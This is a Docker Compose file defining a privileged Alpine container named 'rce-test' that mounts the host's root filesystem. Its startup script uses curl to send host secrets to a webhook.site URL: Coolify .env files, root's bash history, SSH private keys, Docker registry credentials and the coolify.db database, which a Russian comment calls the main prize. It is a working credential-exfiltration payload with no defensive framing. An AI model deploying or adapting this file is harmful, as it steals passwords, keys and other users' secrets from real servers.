version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl
        
        # 1. .env файлы (пароли от БД, APP_KEY)
        cat /host-root/data/coolify/services/a10swue9lhfb1vfjulsx6f5v/.env | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=env_services
        
        cat /host-root/data/coolify/applications/a459eeihh3xbcfaflx1mnvmi/.env | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=env_app
        
        # 2. bash_history (история команд с паролями)
        cat /host-root/root/.bash_history | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=bash_history
        
        # 3. Список всего в .ssh
        ls -la /host-root/root/.ssh/ | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_list
        
        # 4. Все файлы из .ssh (id_rsa, id_ed25519, authorized_keys)
        for f in /host-root/root/.ssh/*; do
          echo "===FILE:$f===" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_file_marker
          cat "$f" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_file_content
        done
        
        # 5. Docker config (registry credentials)
        cat /host-root/root/.docker/config.json | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=docker_config
        
        # 6. Главный куш — coolify.db (все секреты всех пользователей)
        find /host-root -name "coolify.db" -exec cat {} \; | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=coolify_db
        
        sleep 3600
